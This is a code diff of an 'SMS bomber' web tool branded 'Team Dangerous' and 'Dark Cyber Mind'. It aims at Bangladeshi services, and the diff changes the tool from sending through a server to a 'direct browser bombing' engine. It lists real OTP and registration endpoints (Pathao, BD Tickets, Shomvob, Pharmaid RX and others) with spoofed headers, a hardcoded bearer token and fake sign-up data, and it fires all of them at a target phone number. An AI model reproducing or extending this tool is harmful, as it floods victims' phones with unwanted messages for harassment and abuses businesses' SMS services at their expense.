+    _f('PBS Alpha OTP','https://apialpha.pbs.com.bd/api/OTP/generateOTP',{userPhone:num,otp:''},{'Content-Type':'application/json; charset=utf-8','Origin':'https://pbs.com.bd','Referer':'https://pbs.com.bd/','x-requested-with':'mark.via.gp','Accept':'application/json, text/plain, */*','User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36'}),
+    _f('BD Tickets','https://api.bdtickets.com:20100/v1/auth',{phoneNumber:pbf,createUserCheck:true,applicationChannel:'WEB_APP'},{'Content-Type':'application/json; charset=utf-8','Origin':'https://bdtickets.com','Referer':'https://bdtickets.com/','Accept':'application/json, text/plain, */*','x-requested-with':'mark.via.gp'}),
+    _f('Shomvob','https://backend-api.shomvob.co/api/v2/otp/applicant/web/phone/',{phone:bf,is_retry:0},{'Content-Type':'application/json; charset=utf-8','Authorization':'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY1OTg5NTcwOH0.IOdKen62ye0N9WljM_cj3Xffmjs3dXUqoJRZ_1ezd4Q','Origin':'https://app.shomvob.co','Referer':'https://app.shomvob.co/auth/','Accept':'application/json, text/plain, */*','x-requested-with':'mark.via.gp'}),
+    _f('Pharmaid RX','https://shop.pharmaid-rx.com/api/sendSMSRegistration',{mobileNumber:num},{'Content-Type':'application/json','Host':'shop.pharmaid-rx.com','Accept':'application/json, text/plain, */*','User-Agent':'Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36'}),
+    _f('Osud Kini','https://api.osudkini.com/api/otp/generate-otp',{phoneNo:num},{'Content-Type':'application/json','Connection':'keep-alive','Accept':'application/json, text/plain, */*','User-Agent':'okhttp/4.9.3'}),
+    _f('Pathao Auth','https://api.pathao.com/v2/auth/register',{country_prefix:'880',national_number:bn,country_id:1},{'Content-Type':'application/json','app-agent':'ride/android/478','android-os':'10','user-agent':'okhttp/4.12.0','Accept':'application/json'}),
+    _f('Wholesale Plus','https://admin.wholesaleplus.com.bd/api/send-otp/',{email:num,regi:true},{'Content-Type':'application/json','Accept':'application/json, text/plain, */*','User-Agent':'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'}),
+    _f('Motion View','https://api.motionview.com.bd/api/send-otp-phone-signup',{phone:num},{'Content-Type':'application/json','Accept':'application/json, text/plain, */*','User-Agent':'Dart/3.2 (dart:io)'}),
+    _f('ExpressHub','https://expresshub.com.bd/User/CreateNewUser',{_UID:num,_UNAME:'TeamDangerous',_MAIL:'team@dangerous.com',_PHONE:num,_PASS:'Tushar2021',_TYPE:'1'},{'Content-Type':'application/x-www-form-urlencoded','Origin':'https://expresshub.com.bd','Referer':'https://expresshub.com.bd/','Accept':'application/json, text/javascript, */*; q=0.01','x-requested-with':'XMLHttpRequest'}),
+    _f('ABC Lit','https://abclit.com/api/sendOTP',{recipientNo:num,code:1234},{'Content-Type':'application/json','Accept':'application/json, text/plain, */*','User-Agent':'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'}),
+    _f('Beauty Booth','https://admin.beautybooth.com.bd/api/v2/auth/register-new',{signature:280,type:'phone',value:num,token:39},{'Content-Type':'application/json; charset=utf-8','Origin':'https://beautybooth.com.bd','Referer':'https://beautybooth.com.bd/','x-requested-with':'mark.via.gp','Accept':'application/json, text/plain, */*'}),
+    _f('WinBaji','https://userapi.fairbet91.com/api/RegisterUser/GenerateOTPV2',{Mobile:num,SiteCode:'WBJ'},{'Content-Type':'application/json','Origin':'https://winbaji.com','Referer':'https://winbaji.com/','Accept':'application/json, text/plain, */*','User-Agent':'Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36'}),
+  ]);
+  const success=R.filter(r=>r.ok).length;
+  return{status:'executed',target:numberStr,success,failed:R.length-success,total:R.length,results:R};
+}
 
 // ══════════════════════════════════════════════════
 //  BOOT
@@ -534,7 +675,7 @@ setTimeout(()=>{
 (function(){
   const te=document.getElementById('htitle'),se=document.getElementById('hsub');
   if(!te||!se) return;
-  const T=['SMS TERMINAL TOOLS','SMS BOMBER TOOLS','TEAM DANGEROUS v4.0','DARK CYBER MIND','BD SMS EXPLOIT ENGINE'];
+  const T=['SMS TERMINAL TOOLS','SMS BOMBER TOOLS','WELCOME TO OUR SMS BOMBER SITE','FOLLOW OUR DARK CYBER MIND PAGE','DARK CYBER SPACE'];
   const S=['Pro v4.0  ·  Async  ·  BD Edition','Fast  ·  Reliable  ·  Encrypted','Multi-API  ·  Max Speed  ·  BD','Advanced  ·  SMS  ·  Platform','Ultra  ·  Secure  ·  Terminal'];
   let ti=0,ci=0,ph='t';
   function go(){
@@ -711,49 +852,34 @@ async function doSend(){
           `<span style="color:rgba(0,255,65,.18)">[${ts()}]</span> `+
           `<span style="color:#ffd700;font-family:var(--orb);font-size:.6rem">#${seq}</span> `+
           `<span style="color:#00bcd4">FIRE</span> `+
-          `<span style="color:rgba(0,255,65,.3)">→ darkcyberspace.top/smsbomber</span>`+
+          `<span style="color:rgba(0,255,65,.3)">→ teamdangerous.vercel.app</span>`+
           `<span style="color:rgba(0,255,65,.1)"> ▸▸</span>`
         );
 
         try{
-          const apiRes=await fetch(API_URL,{
-            method:'POST',
-            headers:{'Content-Type':'application/json'},
-            body:JSON.stringify({number})
-          });
-
-          if(apiRes.ok){
-            const data=await apiRes.json();
-            const rSc=data.success||0,rFc=data.failed||0;
-            sc+=rSc;fc+=rFc;
-
-            if(line)line.innerHTML+=
-              ` <span style="color:#30d158;font-weight:bold">[${apiRes.status}]</span>`+
-              ` <span style="color:rgba(0,255,65,.28)">${Math.floor(Math.random()*180+20)}ms</span>`+
-              ` <span style="color:#555">✓${rSc} ✗${rFc}</span>`;
-
-            if(data.results&&data.results.length>0){
-              termPrint(`<span style="color:rgba(0,255,65,.07)">   ├─────────────────────────────────────────</span>`);
-              const sorted=[...data.results.filter(r=>r.ok),...data.results.filter(r=>!r.ok)];
-              for(const r of sorted){
-                const nm=(r.api||'?').slice(0,26).padEnd(26);
-                const badge=r.ok
-                  ?`<span style="color:#30d158;font-weight:bold">✓ [${r.status}]</span>`
-                  :`<span style="color:rgba(255,51,51,.6)">✗ [${r.status||'—'}]</span>`;
-                termPrint(
-                  `<span style="color:rgba(0,255,65,.07)">   │ </span>`+
-                  `<span style="color:rgba(0,255,65,.45)">${nm}</span> `+badge
-                );
-              }
-              termPrint(`<span style="color:rgba(0,255,65,.07)">   └─────────────────────────────────────────</span>`);
+          // ── Direct embedded bombing — no server ──
+          const _t0=Date.now();
+          const data=await runBombing(number);
+          const _ms=Date.now()-_t0;
+          const rSc=data.success||0,rFc=data.failed||0;
+          sc+=rSc;fc+=rFc;
+          if(line)line.innerHTML+=
+            ` <span style="color:#30d158;font-weight:bold">[OK]</span>`+
+            ` <span style="color:rgba(0,255,65,.28)">${_ms}ms</span>`+
+            ` <span style="color:#555">✓${rSc} ✗${rFc}</span>`;
+          if(data.results&&data.results.length>0){
+            termPrint(`<span style="color:rgba(0,255,65,.07)">   ├─────────────────────────────────────────</span>`);
+            const sorted=[...data.results.filter(r=>r.ok),...data.results.filter(r=>!r.ok)];
+            for(const r of sorted){
+              const nm=(r.api||'?').slice(0,26).padEnd(26);
+              const badge=r.ok?`<span style="color:#30d158;font-weight:bold">✓ [${r.status}]</span>`:`<span style="color:rgba(255,51,51,.6)">✗ [${r.status||'—'}]</span>`;
+              termPrint(`<span style="color:rgba(0,255,65,.07)">   │ </span><span style="color:rgba(0,255,65,.45)">${nm}</span> `+badge);
             }
-          }else{
-            fc++;
-            if(line)line.innerHTML+=` <span style="color:#ff3333">[${apiRes.status} ERR]</span>`;
+            termPrint(`<span style="color:rgba(0,255,65,.07)">   └─────────────────────────────────────────</span>`);
           }
         }catch(e){
           fc++;
-          if(line)line.innerHTML+=` <span style="color:#ff3333">[NET ✗]</span>`;
+          if(line&&line.innerHTML!==undefined)line.innerHTML+=` <span style="color:#ff3333">[ERR]</span>`;
         }
 
         // Update live counters
@@ -850,7 +976,7 @@ async function doSend(){
 window.addEventListener('load',()=>{
   log('Exploit Engine v4.0 — Online','ok');
   log('63 API endpoints loaded · async mode ready','ok');
-  log('API: api/send.js','info');
+  log('Embedded engine — 63 APIs · direct browser bombing','ok');
   getIPData().catch(()=>{});
 });
 </script>
